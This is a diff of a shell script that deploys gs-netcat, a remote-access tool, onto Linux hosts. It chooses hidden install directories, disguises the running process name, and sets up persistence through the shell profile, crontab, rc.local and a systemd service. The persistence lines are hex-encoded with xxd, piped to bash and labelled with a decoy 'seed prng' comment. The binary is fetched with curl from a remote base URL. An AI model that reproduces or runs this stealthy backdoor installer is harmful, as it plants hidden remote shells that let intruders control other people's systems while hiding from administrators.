@@ -75,11 +75,32 @@ exit_alldone()
 	exit_code 0
 }
 
+# Check if directory is writeable and bins can be executed from there
+# Does not work for busybox as /bin/sh is an applet
+# check_rwx_bin()
+# {
+# 	unset IS_DIR_WREX
+# 	local xdir
+# 	local xbin
+
+# 	xdir="$(dirname "$1")"
+# 	xbin="${xdir}/.gs-sh"
+
+# 	[[ -f "${xbin}" ]] || { cp /bin/sh "${xbin}"; chmod 700 "${xbin}"; }
+# 	echo foo
+
+# 	"${xbin}" -c true && IS_DIR_WREX=1
+# 	echo foo
+
+# }
+
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
-	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
 	# Try systemwide installation first
+	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
+	# check_rwx_bin "$DSTBIN"
+	# [[ -n $IS_DIR_WREX ]] && return
 	touch "$DSTBIN" &>/dev/null && { return; }
 
 	# Try user installation
@@ -87,14 +108,15 @@ init_dstbin()
 	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
 	touch "$DSTBIN" &>/dev/null && { return; }
 
-	# Try /dev/shm 
+	# Try /tmp/.gs
+	DSTBIN="/tmp/.gs-${UID}/${BIN_HIDDEN_NAME}"
+	touch "$DSTBIN" &>/dev/null && { return; }
+
+	# Try /dev/shm as last resort
+	# This is often mounted noexec (e.g. docker) 
 	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
 	touch "$DSTBIN" &>/dev/null && { return; }
 
-	# Try /tmp/.gs as last resort
-	DSTBIN="${TMPDIR}/${BIN_HIDDEN_NAME}"
-	touch "$DSTBIN" &>/dev/null && { return; }
-	
 	errexit "FAILED. Can not find writeable directory."
 }
 
@@ -113,7 +135,7 @@ init_vars()
 		elif [[ x"$arch" == "xarmv6l" ]]; then
 			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
 		else
-			if [[ $(uname -r) == *arch* ]]; then
+			if grep Arch /etc/issue &>/dev/null; then
 				SRC_PKG="gs-netcat_x86_64-arch.tar.gz"
 			else
 				SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
@@ -133,9 +155,9 @@ init_vars()
 	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
 
 	if [[ -d /dev/shm ]]; then
-		TMPDIR="/dev/shm/.gs"
+		TMPDIR="/dev/shm/.gs-${UID}"
 	elif [[ -d /tmp ]]; then
-		TMPDIR="/tmp/.gs"
+		TMPDIR="/tmp/.gs-${UID}"
 	fi
 
 	# Docker does not set USER
@@ -214,7 +236,8 @@ init_setup()
 	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
 	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
-	if command -v xxd >/dev/null; then
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
 		local p
 		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
 		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
@@ -226,6 +249,7 @@ init_setup()
 		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
 	fi
 	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "DSTBIN=${DSTBIN}"
 }
 
 uninstall_rm()
@@ -291,7 +315,7 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; } 
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
 	uninstall_rm "${SERVICE_FILE}"
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
@@ -380,7 +404,7 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 
 	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
 	systemctl start "${SERVICE_HIDDEN_NAME}" && \
-	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work...
+	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...
 
 	IS_SYSTEMD=1
 	IS_GS_RUNNING=1
@@ -509,7 +533,12 @@ dl()
 	fi
 
 	# Debugging / testing. Use local package if available
-	[[ -n "$GS_DEBUG" ]] && [[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+	if [[ -n "$GS_DEBUG" ]]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
+		FAIL_OUT "GS_DEBUG set but deployment binaries not found..."
+		errexit
+	fi
 
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
